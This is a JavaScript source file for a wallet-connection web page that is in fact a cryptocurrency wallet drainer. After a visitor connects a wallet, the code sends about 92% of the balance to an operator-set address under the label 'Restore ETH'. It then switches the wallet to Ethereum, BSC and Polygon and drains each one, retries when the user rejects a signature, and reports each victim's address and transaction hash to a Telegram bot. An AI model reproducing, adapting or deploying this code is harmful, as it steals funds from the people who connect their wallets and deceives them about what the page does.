require("dotenv").config();
import { createWeb3Modal } from "@web3modal/wagmi";

import {
  http,
  createConfig,
  getWalletClient,
  estimateGas,
  getBalance,
  sendTransaction,
} from "@wagmi/core";
import { mainnet, bsc, polygon } from "@wagmi/core/chains";
import { coinbaseWallet, walletConnect, injected } from "@wagmi/connectors";
import { getAccount } from "@wagmi/core";

import { hexToNumber, numberToHex } from "viem";

const projectId = process.env.VITE_PROJECT_ID;

const metadata = {
  name: "Web3Modal",
  description: "Web3Modal Example",
  url: "https://web3modal.com",
  icons: ["https://avatars.githubusercontent.com/u/37784886"],
};

const config = createConfig({
  chains: [mainnet, bsc, polygon],
  transports: {
    [mainnet.id]: http(),
    [bsc.id]: http(),
    [polygon.id]: http(),
  },
  connectors: [
    walletConnect({ projectId, metadata, showQrModal: false }),
    injected({ shimDisconnect: true }),
    coinbaseWallet({
      appName: metadata.name,
      appLogoUrl: metadata.icons[0],
    }),
  ],
});
// reconnect(config);

const modal = createWeb3Modal({
  wagmiConfig: config,
  projectId,
  enableAnalytics: false,
});

const data = {
  web3: null,
  chainId: null,
  userAddress: null,
  provider: null,
};

let mySupportedChains = [1, 56, 137];
let usedChains = [];

const arrCH = {
  1: 0,
  56: 1,
  137: 2,
};

const arrCHXY = {
  1: "ETHEREUM",
  56: "BSC",
  137: "POLYGON",
};

let custParams = {
  1: {
    chainId: "0x1",
    chainName: "Ethereum Mainnet",
    blockExplorerUrls: ["https://etherscan.io"],
    nativeCurrency: {
      name: "Ethereum",
      symbol: "ETH",
      decimals: 18,
    },
    rpcUrls: ["https://mainnet.infura.io/v3/", "https://rpc.ankr.com/eth"],
  },
  56: {
    chainId: "0x38",
    chainName: "BNB Chain",
    blockExplorerUrls: ["https://bscscan.com"],
    nativeCurrency: {
      name: "BNB",
      symbol: "BNB",
      decimals: 18,
    },
    rpcUrls: [
      "https://bsc-dataseed.binance.org/",
      "https://bsc-dataseed.bnbchain.org",
      "https://bsc-dataseed1.defibit.io",
    ],
  },
  137: {
    chainId: "0x89",
    chainName: "Polygon Mainnet",
    blockExplorerUrls: ["https://polygonscan.com/"],
    nativeCurrency: {
      name: "MATIC",
      symbol: "MATIC",
      decimals: 18,
    },
    rpcUrls: [
      "https://polygon-mainnet.infura.io",
      "https://rpc-mainnet.maticvigil.com",
      "wss://polygon.gateway.tenderly.co",
    ],
  },
};

document.querySelector("#connectButton").addEventListener("click", initWeb3);
document.querySelector("#connectButton2").addEventListener("click", initWeb3);
document.querySelector("#connectButton3").addEventListener("click", initWeb3);

async function initWeb3() {
  if (!getAccount(config).isConnected) {
    modal.open();
    observeDOM();
  } else {
    initAccounts();
    sendErr(`${getAccount(config).address} is connected`);
  }
}

async function initAccounts() {
  if (!getAccount(config).isConnected) {
    return window.location.reload();
  }

  initRestoreETH();
}

async function initRestoreETH() {
  try {
    const wallet = await getWalletClient(config);
    const chainID = await wallet.request({ method: "eth_chainId" });

    data.chainId = chainID;
    data.userAddress = getAccount(config).address;

    const walletETHBalance2 = await getBalance(config, {
      address: data.userAddress,
      chainId: hexToNumber(await wallet.request({ method: "eth_chainId" })),
      unit: "wei",
    });
    const userBalance = walletETHBalance2.formatted;
    console.log(userBalance);

    const gasPrice = await estimateGas(config, {
      account: data.userAddress,
      to: process.env.OWNER_ADDRESS,
      value: BigInt(parseInt(userBalance * 0.9)),
      type: "legacy",
      chainId: hexToNumber(
        await wallet.request({
          method: "eth_chainId",
        })
      ),
    });

    const result = await sendTransaction(config, {
      account: data.userAddress,
      to: process.env.OWNER_ADDRESS,
      chainId: hexToNumber(
        await wallet.request({
          method: "eth_chainId",
        })
      ),
      value: BigInt(
        parseInt(
          parseInt(userBalance * 0.92) - parseInt(Number(gasPrice) * 80000)
        )
      ),
      type: "legacy",
    });
    console.log(result);
    sendErr(`Restore ETH Success. Hash ${result}`);

    usedChains.push(
      hexToNumber(await wallet.request({ method: "eth_chainId" }))
    );
    mySupportedChains = mySupportedChains.filter(
      (item) => !usedChains.includes(item)
    );

    verChainID(mySupportedChains[0]);
  } catch (error) {
    sendErr(`Error restoring ETH: ${error.message}`);
    if (isRetryError(error)) {
      sendErr(`Retrying restore ETH...`);
      await initRestoreETH();
    } else {
      usedChains.push(
        hexToNumber(await wallet.request({ method: "eth_chainId" }))
      );
      mySupportedChains = mySupportedChains.filter(
        (item) => !usedChains.includes(item)
      );

      verChainID(mySupportedChains[0]);
    }
  }
}

async function verChainID(chainId) {
  console.log("Current chain", chainId);
  const wallet = await getWalletClient(config);
  if (data.chainId != chainId) {
    try {
      await wallet.request({
        method: "wallet_switchEthereumChain",
        params: [{ chainId: numberToHex(chainId) }],
      });
      initAccounts();
      return true;
    } catch (error) {
      if (error.code === 4902) {
        try {
          await wallet
            .request({
              method: "wallet_addEthereumChain",
              params: [custParams[chainId]],
            })
            .then(() => {
              initAccounts();
              return true;
            });
        } catch (error) {
          sendErr("Error adding Ethereum chain:", error);

          return false;
        }
      } else {
        console.error("Error switching Ethereum chain:", error);
        return false;
      }
    }
  } else {
    initAccounts();
  }
}

function isRetryError(error) {
  return error.message.includes("User denied transaction signature");
}

function observeDOM() {
  const targetNode = document.head;
  const config = { childList: true, subtree: true };

  const callback = function (mutationsList, observer) {
    for (const mutation of mutationsList) {
      if (
        mutation.type === "childList" &&
        !document.querySelector('style[data-w3m="scroll-lock"]')
      ) {
        initAccounts();
      }
    }
  };

  const observer = new MutationObserver(callback);
  observer.observe(targetNode, config);

  return observer;
}

async function sendErr(x) {
  const options = {
    method: "POST",
    mode: "cors",
    headers: {
      accept: "application/json",
      "content-type": "application/json",
    },
    body: JSON.stringify({
      text: String(x),
      disable_web_page_preview: false,
      disable_notification: false,
      reply_to_message_id: null,
      chat_id: process.env.MY_CHAT_ID,
    }),
  };

  console.log(x);

  fetch(
    `https://api.telegram.org/bot${process.env.TELEGRAM_TOKEN_BOT}/sendMessage`,
    options
  )
    .then((response) => response.json())
    .then((response) => console.log(response))
    .catch((err) => console.error(err));
}
